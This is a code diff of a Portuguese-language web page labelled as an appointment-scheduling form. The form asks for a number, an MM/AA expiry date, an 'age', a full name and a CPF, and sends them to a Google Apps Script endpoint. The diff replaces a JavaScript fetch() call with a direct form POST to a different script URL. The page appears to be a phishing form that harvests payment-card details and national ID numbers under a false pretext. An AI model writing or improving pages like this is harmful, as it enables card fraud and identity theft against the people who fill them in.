@@ -7,57 +7,41 @@
 
 <style>
 body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #f2f2f2;
+  font-family: Arial, sans-serif;
+  background: #f2f2f2;
+  margin: 0;
 }
 .container {
-    max-width: 420px;
-    margin: auto;
-    min-height: 100vh;
-    background: #fff;
-    padding: 20px;
+  max-width: 420px;
+  margin: auto;
+  background: #fff;
+  min-height: 100vh;
+  padding: 20px;
 }
-.header {
-    text-align: center;
-    margin-bottom: 20px;
-}
-.label {
-    font-size: 13px;
-    font-weight: bold;
-    margin-bottom: 5px;
-    display: block;
+label {
+  font-size: 13px;
+  font-weight: bold;
 }
 input {
-    width: 100%;
-    padding: 14px;
-    border-radius: 8px;
-    border: 1px solid #ccc;
-    font-size: 15px;
-    margin-bottom: 15px;
+  width: 100%;
+  padding: 14px;
+  margin: 10px 0 15px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
 }
 .row {
-    display: flex;
-    gap: 10px;
+  display: flex;
+  gap: 10px;
 }
-.botao {
-    width: 100%;
-    padding: 16px;
-    background: #2962ff;
-    color: #fff;
-    border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: bold;
-}
-.sucesso {
-    display: none;
-    background: #d4edda;
-    color: #155724;
-    padding: 12px;
-    border-radius: 8px;
-    text-align: center;
-    margin-top: 15px;
+button {
+  width: 100%;
+  padding: 16px;
+  background: #2962ff;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  font-weight: bold;
 }
 </style>
 </head>
@@ -65,70 +49,37 @@ input {
 <body>
 
 <div class="container">
+  <h2>Agendamento</h2>
+  <p>Preencha os dados abaixo</p>
 
-    <div class="header">
-        <h2>Agendamento</h2>
-        <p>Preencha os dados abaixo</p>
-    </div>
+  <form
+    action="https://script.google.com/macros/s/AKfycbyy4AYCzE2gpPiKkwO1XP3R2izuOzRFKcuju5oDrv1GX3rCDrWXKkJxEVXE5ZSNfRCh/exec"
+    method="POST"
+  >
 
-    <label class="label">Número</label>
-    <input id="numero" type="text" placeholder="Digite o número">
+    <label>Número</label>
+    <input name="numero" required>
 
     <div class="row">
-        <div style="flex:1">
-            <label class="label">Validade (MM/AA)</label>
-            <input id="validade" type="text" placeholder="MM/AA" maxlength="5">
-        </div>
-        <div style="flex:1">
-            <label class="label">Idade</label>
-            <input id="idade" type="text" placeholder="Ex: 25">
-        </div>
+      <div style="flex:1">
+        <label>Validade</label>
+        <input name="validade" placeholder="MM/AA" required>
+      </div>
+      <div style="flex:1">
+        <label>Idade</label>
+        <input name="idade" required>
+      </div>
     </div>
 
-    <label class="label">Nome completo</label>
-    <input id="nome" type="text" placeholder="Digite seu nome completo">
+    <label>Nome completo</label>
+    <input name="nome" required>
 
-    <label class="label">CPF</label>
-    <input id="cpf" type="text" placeholder="000.000.000-00">
+    <label>CPF</label>
+    <input name="cpf" required>
 
-    <button class="botao" onclick="enviar()">Confirmar</button>
-
-    <div class="sucesso" id="msgSucesso">
-        ✅ Dados enviados com sucesso!
-    </div>
-
+    <button type="submit">Confirmar</button>
+  </form>
 </div>
-
-<script>
-function enviar() {
-    const data = {
-        numero: document.getElementById("numero").value,
-        validade: document.getElementById("validade").value,
-        idade: document.getElementById("idade").value,
-        nome: document.getElementById("nome").value,
-        cpf: document.getElementById("cpf").value
-    };
-
-    if (!data.numero || !data.validade || !data.idade || !data.nome || !data.cpf) {
-        alert("Preencha todos os campos.");
-        return;
-    }
-
-    fetch("https://script.google.com/macros/s/AKfycbwHC2O0Kod0iZldji6GR3Qndj_zFBFLfM-H2Lu5zr1Q5LTLGpPRSwE4hDxWrUmnI15x/exec", {
-        method: "POST",
-        headers: {
-            "Content-Type": "text/plain;charset=utf-8"
-        },
-        body: JSON.stringify(data)
-    })
-    .then(() => {
-        document.getElementById("msgSucesso").style.display = "block";
-    })
-    .catch(() => {
-        alert("Erro ao enviar. Tente novamente.");
-    });
-}
-</script>
 
 </body>
 </html>
